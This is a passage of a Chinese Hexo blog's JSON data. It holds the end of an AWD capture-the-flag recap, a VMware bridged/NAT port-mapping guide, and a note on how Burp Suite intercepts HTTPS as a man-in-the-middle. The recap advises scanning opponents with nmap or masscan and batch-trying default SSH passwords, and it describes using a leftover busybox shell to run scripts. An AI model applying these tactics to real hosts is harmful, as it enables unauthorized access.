[dbname] &gt; [backupfile].sql</code></pre>\n<ul>\n<li>[uname] - 是有权访问数据库的用户的名称；</li>\n<li>[pass] - 用户密码；</li>\n<li>[dbname] - 是要备份或导出的数据库的名称；</li>\n<li>[backupfile] - 是备份文件的名称。</li>\n</ul>\n<p>提供一个示例数据库配置，比如要将mysql这个数据库导出为一个文件名为mysql-back.sql的数据库文件到当前目录下，则输入下面的命令：</p>\n<pre><code class=\"shell\">[liloong@localhost ~/Backup]$mysqldump -uroot -proot mysql &gt; mysql-back.sql</code></pre>\n<p>用户名：root  密码：root 数据库名：mysql  备份的数据库为：mysql-back.sql</p>\n<p>需要注意的地方是：-p后面直接跟用户名和密码，不要有空格。但-u后面可以有。</p>\n<p><strong>如何使用CLI还原数据库</strong></p>\n<p>恢复或导入我们先前备份的MySQL数据库文件的另一种方法是使用mysql就像备份或导出数据库一样简单。</p>\n<pre><code class=\"php\">mysql -u[uname] -p[pass] [dbname] &lt; [backupfile].sql</code></pre>\n<ul>\n<li>[uname] - 是有权访问数据库的用户名；</li>\n<li>[pass] - 用户密码；</li>\n<li>[dbname] - 是要还原或导入的数据库的名称；</li>\n<li>[backupfile] - 是还原文件的名称。</li>\n</ul>\n<p>然后攻击就开始了，第一件事，扫对手的IP，所以kali可以早早的开好，把命令也准备好，开放以后直接用nmap或者赶时间用masscan扫，扫出来以后甚至可以尝试用ssh默认密码或靶机里原始的shell密码批量连接一下，因为真的有人不知道改ssh密码的！</p>\n<h3 id=\"二、挖洞\"><a href=\"#二、挖洞\" class=\"headerlink\" title=\"二、挖洞\"></a>二、挖洞</h3><p>这次比赛，防御不防御的根本不是最重要的，最重要的是攻击！一个别人没有审计出的漏洞几乎就可以抵消大佬对你造成的所有伤害了。</p>\n<p><strong>代码审计！</strong>要加强！<strong>挖洞</strong>！这才是AWD的核心！</p>\n<p>什么批量化脚本，什么流量监控，在我们现在这个阶段就是空话！真正的大佬都是现场写脚本的！要想把这些脚本用好，下次得把它们的源码研究了，了解了原理，才能最大限度地发挥作用。</p>\n<p>而只要挖到了一个大部分人没掌握的洞，后续输出就像割韭菜一样。</p>\n<h3 id=\"三、技术细节\"><a href=\"#三、技术细节\" class=\"headerlink\" title=\"三、技术细节\"></a>三、技术细节</h3><p>有很技术细节真的是不来参加一次比赛接触不到的。</p>\n<p>比如不死马。其原理和克制方法，网上一查，全都说的头头是道的，实际操作起来可能完全不一样。比如这次，网上说使用</p>\n<pre><code class=\"shell\">ps aux</code></pre>\n<p>命令查看进程，然后 </p>\n<pre><code class=\"shell\">kill -9 [PID]</code></pre>\n<p>杀进程，就能把不死马进程杀掉了。然而，不死马进程的权限是www-data用户的，我们所使用的赛方提供的ubuntu用户根本杀不了它的进程，又或是由于它在不断动态生成，导致进程的PID一直在变(这一段不知道说的对不对)。反正它显示，“不存在该PID的进程”。</p>\n<p>但赛后大佬说直接杀掉全部apache2进程就行了，利用自己传的shell执行命令</p>\n<pre><code class=\"shell\">killall apache2</code></pre>\n<p>直接让apache2重启，所有相关进程自然没有了</p>\n<p>还有大佬说这次主办方直接在靶机里留了Busybox,</p>\n<p><img src=\"/img/image-20201117211912516.png\" alt></p>\n<p>使用</p>\n<pre><code class=\"shell\">/bin/busybox sh</code></pre>\n<p>使用busybox,就可以随便搞了，任意执行命令，这样就可以执行比赛前准备的第三方脚本而不用担心没有权限了。</p>\n<p>又或者，如果没有执行权限，可以先给要执行的文件+x，然后用scp命令传上靶机，因为scp命令是带权限复制的（又是一个非常有用的小细节）</p>\n<p>然后，我们这次没扫出对面ip ,完全是我自己傻逼了的原因。因为之前没用过nmap和masscan, 完全通过文档学习。一开始扫不出东西，我还以为是我命令输错 了，懵逼了好久，然后后来想到了可能D段里没有别的主机了，不同选手的靶机可能在不同的C段，然后nmap扫，扫了快十分钟没扫出来（后来知道选手的靶机在100-150），放弃了，主要是当时心态炸了。</p>\n<p>这次知道了我操作的没问题，下次就会自信多了</p>\n<p>这次的AWD只能说惨淡收场，但明年再战的时候，必重拳出击</p>\n"},{"layout":"post","title":"物理机以及外网访问虚拟机的配置方法","date":"2020-11-18T16:00:00.000Z","description":"一个有用小知识","typora-copy-images-to":"..\\img","_content":"\n# 物理机以及外网访问虚拟机的配置方法\n\nvmware虚拟机的虚拟网络配置有有三种模式：桥接、NAT和Host-Only。\n\n一般情况下，这三种方式都能被物理主机访问，但只有桥接和NAT模式能够被外网访问。三种网络模式我在下篇文章再写，这篇文章记录一下配置桥接模式和NAT模式，让物理机和外网能够访问虚拟机的方法。\n\n### 桥接模式\n\n桥接模式是指本地物理网卡和虚拟网卡通过VMnet0虚拟交换机进行桥接，物理网卡和虚拟网卡在拓扑图上处于同等地位，那么物理网卡和虚拟网卡就相当于处于同一个网段，虚拟交换机就相当于一台现实网络中的交换机,所以两个网卡的IP地址也要设置为同一网段。\n\n也就是说相当于这时虚拟机和物理机同为局域网中的一个主机，他们在同一个D段里，也就是ip的前三段都是一样的，最后一段不同\n\n![image-20201119212813213](\\img\\image-20201119212813214.png)\n\n点击右下角的“更改设置”\n\n![image-20201119212927918](\\img\\image-20201119212927918.png)\n\n如果在局域网中使用，这里直接默认自动设置就行（会自动分配局域网ip以及dns服务器），点击最上面的桥接模式然后点击右下角的应用即可\n\n如果试图在公网中使用，那么它需要你给它手动分配一个你个人使用的公网ip，然后设置好dns服务器\n\n测试一下访问情况\n\n![](\\img\\QQ图片20201119213724.png)\n\n这是ubuntu虚拟机本地访问localhost界面，并且查看到虚拟机的局域网ip为192.168.43.159\n\n\n\n![](\\img\\QQ图片20201119213759.png)\n\n这是使用192.168.43.159这个ip在物理主机上访问的结果，成功访问到ubuntu主页\n\n桥接模式访问成功\n\n### NAT模式\n\nNAT模式，就是让虚拟机借助NAT(网络地址转换)功能，通过宿主机器所在的网络来访问公网。\n\nNAT模式中，虚拟机的网卡和物理网卡的网络，不在同一个网络，虚拟机的网卡，是在vmware提供的一个虚拟网络。\n\n 可以理解为：虚拟机处于物理机中vmware配置的一个虚拟局域网里，大概可以理解为这样的一个层次关系：\n\n公网——>路由——>局域网——>物理主机——>vmware虚拟网络——>虚拟机\n\n也就是说，这时，外网或局域网能够访问到物理主机，物理主机和虚拟机也都能正常访问外网和局域网，而且用的是一个局域网IP。\n\n但在没有建立网络映射的情况下，外网和局域网不能通过物理主机访问到虚拟机。\n\n其实外网访问物理主机也是一样的，如果没有路由和交换机构建的网络映射，外网也同样无法通过路由的公网ip访问到物理主机。\n\n所以，只要模拟路由器在物理主机和虚拟机之间构建好网络映射，就能同过物理机ip和特定端口访问到虚拟机了。\n\n![image-20201119222136524](\\img\\image-20201119222136524.png)\n\n点击右边的NAT设置，配置主机和虚拟机的端口映射\n\n![image-20201119223052918](\\img\\image-20201119223052918.png)\n\n上面我将虚拟机的80端口映射到了物理机的8000端口上，也就是说，只要开启虚拟机的apache服务，就可以通过访问 *http://物理机ip:8000* 这个地址，访问到虚拟机网站服务。\n\n另外一个网站服务类同。\n\n测试一下\n\n![](\\img\\QQ图片20201119213503.png)\n\nubuntu本地访问\n\n![img](\\img\\3V6V_D2AAG9VSZG$REMH4KI.png)\n\n查看物理机IP：192.168.43.150\n\n![img](\\img\\3@N8QYWOA@RJ[ZHAQC2M36.png)\n\n![](\\img\\QQ图片20201119223825.png)\n\n物理机上浏览器使用本机ip加8000端口访问ubuntu网站服务成功","source":"_posts/2020-11-19-物理机以及外网访问虚拟机的配置方法.md","raw":"---\nlayout: post\ntitle: 物理机以及外网访问虚拟机的配置方法\ndate: 2020-11-19\ncategories: blog\ntags: [web,虚拟机]\ndescription: 一个有用小知识\ntypora-copy-images-to: ..\\img\n---\n\n# 物理机以及外网访问虚拟机的配置方法\n\nvmware虚拟机的虚拟网络配置有有三种模式：桥接、NAT和Host-Only。\n\n一般情况下，这三种方式都能被物理主机访问，但只有桥接和NAT模式能够被外网访问。三种网络模式我在下篇文章再写，这篇文章记录一下配置桥接模式和NAT模式，让物理机和外网能够访问虚拟机的方法。\n\n### 桥接模式\n\n桥接模式是指本地物理网卡和虚拟网卡通过VMnet0虚拟交换机进行桥接，物理网卡和虚拟网卡在拓扑图上处于同等地位，那么物理网卡和虚拟网卡就相当于处于同一个网段，虚拟交换机就相当于一台现实网络中的交换机,所以两个网卡的IP地址也要设置为同一网段。\n\n也就是说相当于这时虚拟机和物理机同为局域网中的一个主机，他们在同一个D段里，也就是ip的前三段都是一样的，最后一段不同\n\n![image-20201119212813213](\\img\\image-20201119212813214.png)\n\n点击右下角的“更改设置”\n\n![image-20201119212927918](\\img\\image-20201119212927918.png)\n\n如果在局域网中使用，这里直接默认自动设置就行（会自动分配局域网ip以及dns服务器），点击最上面的桥接模式然后点击右下角的应用即可\n\n如果试图在公网中使用，那么它需要你给它手动分配一个你个人使用的公网ip，然后设置好dns服务器\n\n测试一下访问情况\n\n![](\\img\\QQ图片20201119213724.png)\n\n这是ubuntu虚拟机本地访问localhost界面，并且查看到虚拟机的局域网ip为192.168.43.159\n\n\n\n![](\\img\\QQ图片20201119213759.png)\n\n这是使用192.168.43.159这个ip在物理主机上访问的结果，成功访问到ubuntu主页\n\n桥接模式访问成功\n\n### NAT模式\n\nNAT模式，就是让虚拟机借助NAT(网络地址转换)功能，通过宿主机器所在的网络来访问公网。\n\nNAT模式中，虚拟机的网卡和物理网卡的网络，不在同一个网络，虚拟机的网卡，是在vmware提供的一个虚拟网络。\n\n 可以理解为：虚拟机处于物理机中vmware配置的一个虚拟局域网里，大概可以理解为这样的一个层次关系：\n\n公网——>路由——>局域网——>物理主机——>vmware虚拟网络——>虚拟机\n\n也就是说，这时，外网或局域网能够访问到物理主机，物理主机和虚拟机也都能正常访问外网和局域网，而且用的是一个局域网IP。\n\n但在没有建立网络映射的情况下，外网和局域网不能通过物理主机访问到虚拟机。\n\n其实外网访问物理主机也是一样的，如果没有路由和交换机构建的网络映射，外网也同样无法通过路由的公网ip访问到物理主机。\n\n所以，只要模拟路由器在物理主机和虚拟机之间构建好网络映射，就能同过物理机ip和特定端口访问到虚拟机了。\n\n![image-20201119222136524](\\img\\image-20201119222136524.png)\n\n点击右边的NAT设置，配置主机和虚拟机的端口映射\n\n![image-20201119223052918](\\img\\image-20201119223052918.png)\n\n上面我将虚拟机的80端口映射到了物理机的8000端口上，也就是说，只要开启虚拟机的apache服务，就可以通过访问 *http://物理机ip:8000* 这个地址，访问到虚拟机网站服务。\n\n另外一个网站服务类同。\n\n测试一下\n\n![](\\img\\QQ图片20201119213503.png)\n\nubuntu本地访问\n\n![img](\\img\\3V6V_D2AAG9VSZG$REMH4KI.png)\n\n查看物理机IP：192.168.43.150\n\n![img](\\img\\3@N8QYWOA@RJ[ZHAQC2M36.png)\n\n![](\\img\\QQ图片20201119223825.png)\n\n物理机上浏览器使用本机ip加8000端口访问ubuntu网站服务成功","slug":"2020-11-19-物理机以及外网访问虚拟机的配置方法","published":1,"updated":"2020-11-19T14:53:03.024Z","comments":1,"photos":[],"link":"","_id":"ckkntx9jv0016xov7gmqitli7","content":"<h1 id=\"物理机以及外网访问虚拟机的配置方法\"><a href=\"#物理机以及外网访问虚拟机的配置方法\" class=\"headerlink\" title=\"物理机以及外网访问虚拟机的配置方法\"></a>物理机以及外网访问虚拟机的配置方法</h1><p>vmware虚拟机的虚拟网络配置有有三种模式：桥接、NAT和Host-Only。</p>\n<p>一般情况下，这三种方式都能被物理主机访问，但只有桥接和NAT模式能够被外网访问。三种网络模式我在下篇文章再写，这篇文章记录一下配置桥接模式和NAT模式，让物理机和外网能够访问虚拟机的方法。</p>\n<h3 id=\"桥接模式\"><a href=\"#桥接模式\" class=\"headerlink\" title=\"桥接模式\"></a>桥接模式</h3><p>桥接模式是指本地物理网卡和虚拟网卡通过VMnet0虚拟交换机进行桥接，物理网卡和虚拟网卡在拓扑图上处于同等地位，那么物理网卡和虚拟网卡就相当于处于同一个网段，虚拟交换机就相当于一台现实网络中的交换机,所以两个网卡的IP地址也要设置为同一网段。</p>\n<p>也就是说相当于这时虚拟机和物理机同为局域网中的一个主机，他们在同一个D段里，也就是ip的前三段都是一样的，最后一段不同</p>\n<p><img src=\"%5Cimg%5Cimage-20201119212813214.png\" alt=\"image-20201119212813213\"></p>\n<p>点击右下角的“更改设置”</p>\n<p><img src=\"%5Cimg%5Cimage-20201119212927918.png\" alt=\"image-20201119212927918\"></p>\n<p>如果在局域网中使用，这里直接默认自动设置就行（会自动分配局域网ip以及dns服务器），点击最上面的桥接模式然后点击右下角的应用即可</p>\n<p>如果试图在公网中使用，那么它需要你给它手动分配一个你个人使用的公网ip，然后设置好dns服务器</p>\n<p>测试一下访问情况</p>\n<p><img src=\"%5Cimg%5CQQ%E5%9B%BE%E7%89%8720201119213724.png\" alt=\"\"></p>\n<p>这是ubuntu虚拟机本地访问localhost界面，并且查看到虚拟机的局域网ip为192.168.43.159</p>\n<p><img src=\"%5Cimg%5CQQ%E5%9B%BE%E7%89%8720201119213759.png\" alt=\"\"></p>\n<p>这是使用192.168.43.159这个ip在物理主机上访问的结果，成功访问到ubuntu主页</p>\n<p>桥接模式访问成功</p>\n<h3 id=\"NAT模式\"><a href=\"#NAT模式\" class=\"headerlink\" title=\"NAT模式\"></a>NAT模式</h3><p>NAT模式，就是让虚拟机借助NAT(网络地址转换)功能，通过宿主机器所在的网络来访问公网。</p>\n<p>NAT模式中，虚拟机的网卡和物理网卡的网络，不在同一个网络，虚拟机的网卡，是在vmware提供的一个虚拟网络。</p>\n<p> 可以理解为：虚拟机处于物理机中vmware配置的一个虚拟局域网里，大概可以理解为这样的一个层次关系：</p>\n<p>公网——&gt;路由——&gt;局域网——&gt;物理主机——&gt;vmware虚拟网络——&gt;虚拟机</p>\n<p>也就是说，这时，外网或局域网能够访问到物理主机，物理主机和虚拟机也都能正常访问外网和局域网，而且用的是一个局域网IP。</p>\n<p>但在没有建立网络映射的情况下，外网和局域网不能通过物理主机访问到虚拟机。</p>\n<p>其实外网访问物理主机也是一样的，如果没有路由和交换机构建的网络映射，外网也同样无法通过路由的公网ip访问到物理主机。</p>\n<p>所以，只要模拟路由器在物理主机和虚拟机之间构建好网络映射，就能同过物理机ip和特定端口访问到虚拟机了。</p>\n<p><img src=\"%5Cimg%5Cimage-20201119222136524.png\" alt=\"image-20201119222136524\"></p>\n<p>点击右边的NAT设置，配置主机和虚拟机的端口映射</p>\n<p><img src=\"%5Cimg%5Cimage-20201119223052918.png\" alt=\"image-20201119223052918\"></p>\n<p>上面我将虚拟机的80端口映射到了物理机的8000端口上，也就是说，只要开启虚拟机的apache服务，就可以通过访问 <em>http://物理机ip:8000</em> 这个地址，访问到虚拟机网站服务。</p>\n<p>另外一个网站服务类同。</p>\n<p>测试一下</p>\n<p><img src=\"%5Cimg%5CQQ%E5%9B%BE%E7%89%8720201119213503.png\" alt=\"\"></p>\n<p>ubuntu本地访问</p>\n<p><img src=\"%5Cimg%5C3V6V_D2AAG9VSZG$REMH4KI.png\" alt=\"img\"></p>\n<p>查看物理机IP：192.168.43.150</p>\n<p><img src=\"%5Cimg%5C3@N8QYWOA@RJ%5BZHAQC2M36.png\" alt=\"img\"></p>\n<p><img src=\"%5Cimg%5CQQ%E5%9B%BE%E7%89%8720201119223825.png\" alt=\"\"></p>\n<p>物理机上浏览器使用本机ip加8000端口访问ubuntu网站服务成功</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"物理机以及外网访问虚拟机的配置方法\"><a href=\"#物理机以及外网访问虚拟机的配置方法\" class=\"headerlink\" title=\"物理机以及外网访问虚拟机的配置方法\"></a>物理机以及外网访问虚拟机的配置方法</h1><p>vmware虚拟机的虚拟网络配置有有三种模式：桥接、NAT和Host-Only。</p>\n<p>一般情况下，这三种方式都能被物理主机访问，但只有桥接和NAT模式能够被外网访问。三种网络模式我在下篇文章再写，这篇文章记录一下配置桥接模式和NAT模式，让物理机和外网能够访问虚拟机的方法。</p>\n<h3 id=\"桥接模式\"><a href=\"#桥接模式\" class=\"headerlink\" title=\"桥接模式\"></a>桥接模式</h3><p>桥接模式是指本地物理网卡和虚拟网卡通过VMnet0虚拟交换机进行桥接，物理网卡和虚拟网卡在拓扑图上处于同等地位，那么物理网卡和虚拟网卡就相当于处于同一个网段，虚拟交换机就相当于一台现实网络中的交换机,所以两个网卡的IP地址也要设置为同一网段。</p>\n<p>也就是说相当于这时虚拟机和物理机同为局域网中的一个主机，他们在同一个D段里，也就是ip的前三段都是一样的，最后一段不同</p>\n<p><img src=\"%5Cimg%5Cimage-20201119212813214.png\" alt=\"image-20201119212813213\"></p>\n<p>点击右下角的“更改设置”</p>\n<p><img src=\"%5Cimg%5Cimage-20201119212927918.png\" alt=\"image-20201119212927918\"></p>\n<p>如果在局域网中使用，这里直接默认自动设置就行（会自动分配局域网ip以及dns服务器），点击最上面的桥接模式然后点击右下角的应用即可</p>\n<p>如果试图在公网中使用，那么它需要你给它手动分配一个你个人使用的公网ip，然后设置好dns服务器</p>\n<p>测试一下访问情况</p>\n<p><img src=\"%5Cimg%5CQQ%E5%9B%BE%E7%89%8720201119213724.png\" alt></p>\n<p>这是ubuntu虚拟机本地访问localhost界面，并且查看到虚拟机的局域网ip为192.168.43.159</p>\n<p><img src=\"%5Cimg%5CQQ%E5%9B%BE%E7%89%8720201119213759.png\" alt></p>\n<p>这是使用192.168.43.159这个ip在物理主机上访问的结果，成功访问到ubuntu主页</p>\n<p>桥接模式访问成功</p>\n<h3 id=\"NAT模式\"><a href=\"#NAT模式\" class=\"headerlink\" title=\"NAT模式\"></a>NAT模式</h3><p>NAT模式，就是让虚拟机借助NAT(网络地址转换)功能，通过宿主机器所在的网络来访问公网。</p>\n<p>NAT模式中，虚拟机的网卡和物理网卡的网络，不在同一个网络，虚拟机的网卡，是在vmware提供的一个虚拟网络。</p>\n<p> 可以理解为：虚拟机处于物理机中vmware配置的一个虚拟局域网里，大概可以理解为这样的一个层次关系：</p>\n<p>公网——&gt;路由——&gt;局域网——&gt;物理主机——&gt;vmware虚拟网络——&gt;虚拟机</p>\n<p>也就是说，这时，外网或局域网能够访问到物理主机，物理主机和虚拟机也都能正常访问外网和局域网，而且用的是一个局域网IP。</p>\n<p>但在没有建立网络映射的情况下，外网和局域网不能通过物理主机访问到虚拟机。</p>\n<p>其实外网访问物理主机也是一样的，如果没有路由和交换机构建的网络映射，外网也同样无法通过路由的公网ip访问到物理主机。</p>\n<p>所以，只要模拟路由器在物理主机和虚拟机之间构建好网络映射，就能同过物理机ip和特定端口访问到虚拟机了。</p>\n<p><img src=\"%5Cimg%5Cimage-20201119222136524.png\" alt=\"image-20201119222136524\"></p>\n<p>点击右边的NAT设置，配置主机和虚拟机的端口映射</p>\n<p><img src=\"%5Cimg%5Cimage-20201119223052918.png\" alt=\"image-20201119223052918\"></p>\n<p>上面我将虚拟机的80端口映射到了物理机的8000端口上，也就是说，只要开启虚拟机的apache服务，就可以通过访问 <em>http://物理机ip:8000</em> 这个地址，访问到虚拟机网站服务。</p>\n<p>另外一个网站服务类同。</p>\n<p>测试一下</p>\n<p><img src=\"%5Cimg%5CQQ%E5%9B%BE%E7%89%8720201119213503.png\" alt></p>\n<p>ubuntu本地访问</p>\n<p><img src=\"%5Cimg%5C3V6V_D2AAG9VSZG$REMH4KI.png\" alt=\"img\"></p>\n<p>查看物理机IP：192.168.43.150</p>\n<p><img src=\"%5Cimg%5C3@N8QYWOA@RJ%5BZHAQC2M36.png\" alt=\"img\"></p>\n<p><img src=\"%5Cimg%5CQQ%E5%9B%BE%E7%89%8720201119223825.png\" alt></p>\n<p>物理机上浏览器使用本机ip加8000端口访问ubuntu网站服务成功</p>\n"},{"layout":"post","title":"Burpsuite拦截HTTPS过程与原理","date":"2020-11-20T16:00:00.000Z","description":"笔记","typora-copy-images-to":"..\\img","typora-root-url":"..","_content":"\n# Burpsuite拦截HTTPS过程与原理\n\n## SSL握手过程\n\n访问https网站，浏览器向服务器发送ssl client  hello请求，服务器进行响应发回自己的证书（是的每一次建立ssl连接服务器都会向客户端发送证书不要怀疑），浏览器收到服务器的证书后检测证书的签发机构（即CA）是否在自己信任的机构列表中，如果不在则浏览器报错并终止ssl握手过程如果在则继续进行后续握手步骤。\n\n## https代理原理\n\n首先，浏览器向服务器发起ssl client  hello请求\n\nburpsuite作为代理，可以理解为它“伪造“成服务器，向浏览器发回使用burpsuite自己证书作为为当前目标网站的证书与浏览器建立一个连接（暂称其为C1）；\n\n同时burpsuite向真正的服务器发送一个ssl client  hello，与真正的服务器建立另一个连接（暂称其为C2）。\n\n所以真正的请求是浏览器通过C1向burpsuite提交数据，burpsuite又从C1中把http数据拿出来通过C2提交到真正的服务器，响应过程则反过来，将服务器通过C2传输的http数据拿出来，用自己的私钥加密，再传给浏览器。\n\nburpsuite不能直接把服务器的证书和数据包一起转给浏览器，只能用CA的公钥解包后提取数据，引入自己的证书再加密发给浏览器；否则，直接将服务器证书交给浏览器，burpsuite就拿不到里面的服务器公钥了，之后就算抓到数据包，没有服务器私钥也解不出http的内容。\n\nburpsuite本质上即是一个中间人，或者说中间人攻击说的就是burpsuite这种形式。\n\n而如果浏览器发现收到的证书的签发机构不在自己的信任列表中则会报错或警告。\n\n具体到burpsuite，返回给浏览器的证书是burpsuite自己签名的证书（burpsuite代理时返回给浏览器的证书是burpsuite针对该网站临时签名的证书，）而burpsuite自己的证书不在浏览器默认的信任CA列表中，所以会导致警报或报错。\n\n所以为什么在使用burpsuite拦截https前，要导入burp suite的证书，就是要把burpsuite的CA证书导入到浏览器的信任证书机构列表中的，使浏览器以后再接收到burpsuite签发的证书时不再报错。\n\n\n\n导入的证书信息如下：\n\n![img](https://img2018.cnblogs.com/blog/1116722/201907/1116722-20190717104300636-2032046177.png)\n\nburpsuite代理该问网站时，网站证书如下：\n\n![img](https://img2018.cnblogs.com/blog/1116722/201907/1116722-20190717104415239-1588036366.png)\n\n直接访问网站时，网站证书如下：\n\n![img](https://img2018.cnblogs.com/blog/1116722/201907/1116722-20190717104607056-1486305447.png)\n\n","source":"_posts/2020-11-21-burpsuite拦截HTTPS过程与原理.md","raw":"---\nlayout: post\ntitle: Burpsuite拦截HTTPS过程与原理\ndate: 2020-11-21\ncategories: blog\ntags: [web,计算机网络]\ndescription: 笔记\ntypora-copy-images-to: ..\\img\ntypora-root-url: ..\n---\n\n# Burpsuite拦截HTTPS过程与原理\n\n## SSL握手过程\n\n访问https网站，浏览器向服务器发送ssl client  hello请求，服务器进行响应发回自己的证书（是的每一次建立ssl连接服务器都会向客户端发送证书不要怀疑），浏览器收到服务器的证书后检测证书的签发机构（即CA）是否在自己信任的机构列表中，如果不在则浏览器报错并终止ssl握手过程如果在则继续进行后续握手步骤。\n\n## https代理原理\n\n首先，浏览器向服务器发起ssl client  hello请求\n\nburpsuite作为代理，可以理解为它“伪造“成服务器，向浏览器发回使用burpsuite自己证书作为为当前目标网站的证书与浏览器建立一个连接（暂称其为C1）；\n\n同时burpsuite向真正的服务器发送一个ssl client  hello，与真正的服务器建立另一个连接（暂称其为C2）。\n\n所以真正的请求是浏览器通过C1向burpsuite提交数据，burpsuite又从C1中把http数据拿出来通过C2提交到真正的服务器，响应过程则反过来，将服务器通过C2传输的http数据拿出来，用自己的私钥加密，再传给浏览器。\n\nburpsuite不能直接把服务器的证书和数据包一起转给浏览器，只能用CA的公钥解包后提取数据，引入自己的证书再加密发给浏览器；否则，直接将服务器证书交给浏览器，burpsuite就拿不到里面的服务器公钥了，之后就算抓到数据包，没有服务器私钥也解不出http的内容。\n\nburpsuite本质上即是一个中间人，或者说中间人攻击说的就是burpsuite这种形式。\n\n而如果浏览器发现收到的证书的签发机构不在自己的信任列表中则会报错或警告。\n\n具体到burpsuite，返回给浏览器的证书是burpsuite自己签名的证书（burpsuite代理时返回给浏览器的证书是burpsuite针对该网站临时签名的证书，）而burpsuite自己的证书不在浏览器默认的信任CA列表中，所以会导致警报或报错。\n\n所以为什么在使用burpsuite拦截https前，要导入burp suite的证书，就是要把burpsuite的CA证书导入到浏览器的信任证书机构列表中的，使浏览器以后再接收到burpsuite签发的证书时不再报错。\n\n\n\n导入的证书信息如下：\n\n![img](https://img2018.cnblogs.com/blog/1116722/201907/1116722-20190717104300636-2032046177.png)\n\nburpsuite代理该问网站时，网站证书如下：\n\n![img](https://img2018.cnblogs.com/blog/1116722/201907/1116722-20190717104415239-1588036366.png)\n\n直接访问网站时，网站证书如下：\n\n![img](https://img2018.cnblogs.com/blog/1116722/201907/1116722-20190717104607056-1486305447.png)\n\n","slug":"2020-11-21-burpsuite拦截HTTPS过程与原理","published":1,"updated":"2020-12-06T12:20:20.509Z","comments":1,"photos":[],"link":"","_id":"ckkntx9jx0018xov7yi5501f7","content":"<h1 id=\"Burpsuite拦截HTTPS过程与原理\"><a href=\"#Burpsuite拦截HTTPS过程与原理\" class=\"headerlink\" title=\"Burpsuite拦截HTTPS过程与原理\"></a>Burpsuite拦截HTTPS过程与原理</h1><h2 id=\"SSL握手过程\"><a href=\"#SSL握手过程\" class=\"headerlink\" title=\"SSL握手过程\"></a>SSL握手过程</h2><p>访问https网站，浏览器向服务器发送ssl client  hello请求，服务器进行响应发回自己的证书（是的每一次建立ssl连接服务器都会向客户端发送证书不要怀疑），浏览器收到服务器的证书后检测证书的签发机构（即CA）是否在自己信任的机构列表中，如果不在则浏览器报错并终止ssl握手过程如果在则继续进行后续握手步骤。</p>\n<h2 id=\"https代理原理\"><a href=\"#https代理原理\" class=\"headerlink\" title=\"https代理原理\"></a>https代理原理</h2><p>首先，浏览器向服务器发起ssl client  hello请求</p>\n<p>burpsuite作为代理，可以理解为它“伪造“成服务器，向浏览器发回使用burpsuite自己证书作为为当前目标网站的证书与浏览器建立一个连接（暂称其为C1）；</p>\n<p>同时burpsuite向真正的服务器发送一个ssl client  